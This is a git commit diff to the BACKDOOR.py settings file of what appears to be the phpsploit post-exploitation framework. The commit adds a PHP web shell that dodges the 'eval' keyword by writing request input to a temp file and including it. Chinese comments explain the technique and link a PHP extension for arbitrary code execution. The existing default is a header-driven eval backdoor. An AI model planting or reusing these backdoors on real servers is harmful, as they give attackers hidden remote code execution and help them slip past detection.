764e62c23244ed9ee4d9b6dda9c80bb93e6de32c
Nan3r <nan3r@foxmail.com>
2019-12-21 18:33:23 +0800

    Update BACKDOOR.py

--- src/core/session/settings/BACKDOOR.py
+++ src/core/session/settings/BACKDOOR.py
@@ -27,6 +27,27 @@ def validator(value):
         raise ValueError("shall contain %%PASSKEY%% string")
     return datatypes.PhpCode(value)
 
+"""
+1.替代eval 关键字的方式之一
+<?php
+function update($phpCode) {
+    $tmpfname = tempnam("/tmp", "update");
+    $handle = fopen($tmpfname, "w+");
+    fwrite($handle, "<?php\n" . $phpCode);
+    fclose($handle);
+    include $tmpfname;
+    unlink($tmpfname);
+    return get_defined_vars();
+}
+extract(update($_REQUEST["c"]));
 
+
+2.使用php扩展
+https://github.com/phith0n/arbitrary-php-extension
+
+*/
+"""
+
+//phpsploit 主要通过eval执行代码方式，这个backdoor是执行head中phpcode，然后header会执行post过来真正要执行操作的phpcode
 def default_value():
     return("@eval($_SERVER['HTTP_%%PASSKEY%%']);")
